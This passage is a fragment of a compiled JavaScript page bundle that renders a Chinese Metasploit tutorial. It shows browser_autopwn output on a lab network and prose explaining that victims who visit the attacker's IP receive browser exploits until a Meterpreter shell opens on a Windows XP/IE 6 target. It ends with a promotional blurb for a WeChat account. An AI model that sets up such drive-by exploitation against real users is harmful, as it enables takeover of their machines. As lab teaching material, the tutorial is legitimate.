"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128:7777 \n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" --- Done, found "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v(" exploit modules\n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br"),s("span",{staticClass:"line-number"},[t._v("20")]),s("br"),s("span",{staticClass:"line-number"},[t._v("21")]),s("br"),s("span",{staticClass:"line-number"},[t._v("22")]),s("br"),s("span",{staticClass:"line-number"},[t._v("23")]),s("br"),s("span",{staticClass:"line-number"},[t._v("24")]),s("br"),s("span",{staticClass:"line-number"},[t._v("25")]),s("br"),s("span",{staticClass:"line-number"},[t._v("26")]),s("br"),s("span",{staticClass:"line-number"},[t._v("27")]),s("br"),s("span",{staticClass:"line-number"},[t._v("28")]),s("br"),s("span",{staticClass:"line-number"},[t._v("29")]),s("br"),s("span",{staticClass:"line-number"},[t._v("30")]),s("br"),s("span",{staticClass:"line-number"},[t._v("31")]),s("br"),s("span",{staticClass:"line-number"},[t._v("32")]),s("br"),s("span",{staticClass:"line-number"},[t._v("33")]),s("br"),s("span",{staticClass:"line-number"},[t._v("34")]),s("br"),s("span",{staticClass:"line-number"},[t._v("35")]),s("br"),s("span",{staticClass:"line-number"},[t._v("36")]),s("br"),s("span",{staticClass:"line-number"},[t._v("37")]),s("br"),s("span",{staticClass:"line-number"},[t._v("38")]),s("br"),s("span",{staticClass:"line-number"},[t._v("39")]),s("br"),s("span",{staticClass:"line-number"},[t._v("40")]),s("br"),s("span",{staticClass:"line-number"},[t._v("41")]),s("br"),s("span",{staticClass:"line-number"},[t._v("42")]),s("br"),s("span",{staticClass:"line-number"},[t._v("43")]),s("br"),s("span",{staticClass:"line-number"},[t._v("44")]),s("br"),s("span",{staticClass:"line-number"},[t._v("45")]),s("br"),s("span",{staticClass:"line-number"},[t._v("46")]),s("br"),s("span",{staticClass:"line-number"},[t._v("47")]),s("br"),s("span",{staticClass:"line-number"},[t._v("48")]),s("br"),s("span",{staticClass:"line-number"},[t._v("49")]),s("br"),s("span",{staticClass:"line-number"},[t._v("50")]),s("br"),s("span",{staticClass:"line-number"},[t._v("51")]),s("br"),s("span",{staticClass:"line-number"},[t._v("52")]),s("br"),s("span",{staticClass:"line-number"},[t._v("53")]),s("br"),s("span",{staticClass:"line-number"},[t._v("54")]),s("br"),s("span",{staticClass:"line-number"},[t._v("55")]),s("br"),s("span",{staticClass:"line-number"},[t._v("56")]),s("br"),s("span",{staticClass:"line-number"},[t._v("57")]),s("br"),s("span",{staticClass:"line-number"},[t._v("58")]),s("br"),s("span",{staticClass:"line-number"},[t._v("59")]),s("br"),s("span",{staticClass:"line-number"},[t._v("60")]),s("br"),s("span",{staticClass:"line-number"},[t._v("61")]),s("br"),s("span",{staticClass:"line-number"},[t._v("62")]),s("br"),s("span",{staticClass:"line-number"},[t._v("63")]),s("br"),s("span",{staticClass:"line-number"},[t._v("64")]),s("br"),s("span",{staticClass:"line-number"},[t._v("65")]),s("br"),s("span",{staticClass:"line-number"},[t._v("66")]),s("br"),s("span",{staticClass:"line-number"},[t._v("67")]),s("br"),s("span",{staticClass:"line-number"},[t._v("68")]),s("br"),s("span",{staticClass:"line-number"},[t._v("69")]),s("br"),s("span",{staticClass:"line-number"},[t._v("70")]),s("br"),s("span",{staticClass:"line-number"},[t._v("71")]),s("br"),s("span",{staticClass:"line-number"},[t._v("72")]),s("br"),s("span",{staticClass:"line-number"},[t._v("73")]),s("br"),s("span",{staticClass:"line-number"},[t._v("74")]),s("br"),s("span",{staticClass:"line-number"},[t._v("75")]),s("br"),s("span",{staticClass:"line-number"},[t._v("76")]),s("br"),s("span",{staticClass:"line-number"},[t._v("77")]),s("br"),s("span",{staticClass:"line-number"},[t._v("78")]),s("br"),s("span",{staticClass:"line-number"},[t._v("79")]),s("br"),s("span",{staticClass:"line-number"},[t._v("80")]),s("br"),s("span",{staticClass:"line-number"},[t._v("81")]),s("br"),s("span",{staticClass:"line-number"},[t._v("82")]),s("br"),s("span",{staticClass:"line-number"},[t._v("83")]),s("br"),s("span",{staticClass:"line-number"},[t._v("84")]),s("br"),s("span",{staticClass:"line-number"},[t._v("85")]),s("br"),s("span",{staticClass:"line-number"},[t._v("86")]),s("br"),s("span",{staticClass:"line-number"},[t._v("87")]),s("br"),s("span",{staticClass:"line-number"},[t._v("88")]),s("br"),s("span",{staticClass:"line-number"},[t._v("89")]),s("br"),s("span",{staticClass:"line-number"},[t._v("90")]),s("br"),s("span",{staticClass:"line-number"},[t._v("91")]),s("br"),s("span",{staticClass:"line-number"},[t._v("92")]),s("br"),s("span",{staticClass:"line-number"},[t._v("93")]),s("br"),s("span",{staticClass:"line-number"},[t._v("94")]),s("br"),s("span",{staticClass:"line-number"},[t._v("95")]),s("br"),s("span",{staticClass:"line-number"},[t._v("96")]),s("br"),s("span",{staticClass:"line-number"},[t._v("97")]),s("br"),s("span",{staticClass:"line-number"},[t._v("98")]),s("br"),s("span",{staticClass:"line-number"},[t._v("99")]),s("br"),s("span",{staticClass:"line-number"},[t._v("100")]),s("br"),s("span",{staticClass:"line-number"},[t._v("101")]),s("br"),s("span",{staticClass:"line-number"},[t._v("102")]),s("br"),s("span",{staticClass:"line-number"},[t._v("103")]),s("br"),s("span",{staticClass:"line-number"},[t._v("104")]),s("br"),s("span",{staticClass:"line-number"},[t._v("105")]),s("br"),s("span",{staticClass:"line-number"},[t._v("106")]),s("br"),s("span",{staticClass:"line-number"},[t._v("107")]),s("br"),s("span",{staticClass:"line-number"},[t._v("108")]),s("br"),s("span",{staticClass:"line-number"},[t._v("109")]),s("br"),s("span",{staticClass:"line-number"},[t._v("110")]),s("br"),s("span",{staticClass:"line-number"},[t._v("111")]),s("br"),s("span",{staticClass:"line-number"},[t._v("112")]),s("br"),s("span",{staticClass:"line-number"},[t._v("113")]),s("br"),s("span",{staticClass:"line-number"},[t._v("114")]),s("br"),s("span",{staticClass:"line-number"},[t._v("115")]),s("br"),s("span",{staticClass:"line-number"},[t._v("116")]),s("br"),s("span",{staticClass:"line-number"},[t._v("117")]),s("br"),s("span",{staticClass:"line-number"},[t._v("118")]),s("br"),s("span",{staticClass:"line-number"},[t._v("119")]),s("br"),s("span",{staticClass:"line-number"},[t._v("120")]),s("br"),s("span",{staticClass:"line-number"},[t._v("121")]),s("br"),s("span",{staticClass:"line-number"},[t._v("122")]),s("br"),s("span",{staticClass:"line-number"},[t._v("123")]),s("br"),s("span",{staticClass:"line-number"},[t._v("124")]),s("br"),s("span",{staticClass:"line-number"},[t._v("125")]),s("br"),s("span",{staticClass:"line-number"},[t._v("126")]),s("br"),s("span",{staticClass:"line-number"},[t._v("127")]),s("br"),s("span",{staticClass:"line-number"},[t._v("128")]),s("br")])]),s("p",[t._v("现在任何一个连接到攻击机80端口的目标都会遭到一个基于它所使用的浏览器的渗透攻击。当有受害者访问我们的IP地址时，browser autopwn模块就会向其发送各种漏洞模块，直到获得Meterpreter控制权限为止。")]),t._v(" "),s("p",[t._v("此时，我们在靶机WinXP上打开IE 6访问连接http://192.168.175.128，")]),t._v(" "),s("p",[t._v("这样，我们就可以拿到靶机的Shell了")]),t._v(" "),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[t._v("#")]),t._v(" 写在最后")]),t._v(" "),s("blockquote",[s("p",[t._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[t._v("冰河技术")]),t._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[t._v("冰河技术")]),t._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[t._v("冰河技术")]),t._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[t._v("冰河技术")]),t._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),t._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=e.exports}}]);